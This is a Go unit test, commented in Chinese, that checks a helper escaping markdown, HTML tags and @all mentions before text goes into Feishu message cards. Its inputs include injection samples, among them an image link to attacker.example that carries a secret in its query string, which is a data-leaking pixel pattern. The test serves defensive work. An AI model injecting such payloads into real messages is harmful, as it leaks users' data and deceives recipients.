package api

import "testing"

// TestEscapeFeishuMarkdown 直接卡住转义 helper 的契约：链接、图片、强调、代码、
// 标题、引用、列表/表格、HTML 标签与 @所有人 都不能原样进入卡片 markdown；
// 正常中文、换行、数字、百分号必须原样保留。
func TestEscapeFeishuMarkdown(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "链接语法",
			in:   "[点我](https://evil.example)",
			want: `\[点我\]\(https://evil\.example\)`,
		},
		{
			name: "图片语法",
			in:   "![](https://attacker.example/px?u=secret)",
			want: `\!\[\]\(https://attacker\.example/px?u=secret\)`,
		},
		{
			name: "加粗斜体删除线",
			in:   "**粗** _斜_ ~~删~~",
			want: `\*\*粗\*\* \_斜\_ \~\~删\~\~`,
		},
		{
			name: "行内代码与代码块",
			in:   "用 `code` 和 ```块```",
			want: "用 \\`code\\` 和 \\`\\`\\`块\\`\\`\\`",
		},
		{
			name: "标题与引用",
			in:   "# 标题\n> 引用",
			want: "\\# 标题\n\\> 引用",
		},
		{
			name: "列表与表格",
			in:   "- 项\n+ 项\n1. 项\n| a | b |",
			want: "\\- 项\n\\+ 项\n1\\. 项\n\\| a \\| b \\|",
		},
		{
			name: "反斜杠不能中和后续转义",
			in:   `\[点我](https://evil)`,
			want: `\\\[点我\]\(https://evil\)`,
		},
		{
			name: "HTML 链接和 @所有人",
			in:   "<a href='https://evil'>点我</a><at id=all></at>",
			want: `&lt;a href='https://evil'\>点我&lt;/a\>&lt;at id=all\>&lt;/at\>`,
		},
		{
			name: "HTML 实体与占位符",
			in:   "R&D &#60; {{title}}",
			want: `R&amp;D &amp;\#60; \{\{title\}\}`,
		},
		{
			name: "正常中文换行数字百分号不变",
			in:   "需要查看考勤流程\n核对 60% 的排班，第 2 行",
			want: "需要查看考勤流程\n核对 60% 的排班，第 2 行",
		},
		{name: "空串", in: "", want: ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := escapeFeishuMarkdown(c.in); got != c.want {
				t.Fatalf("escapeFeishuMarkdown(%q) = %q，应为 %q", c.in, got, c.want)
			}
		})
	}
}
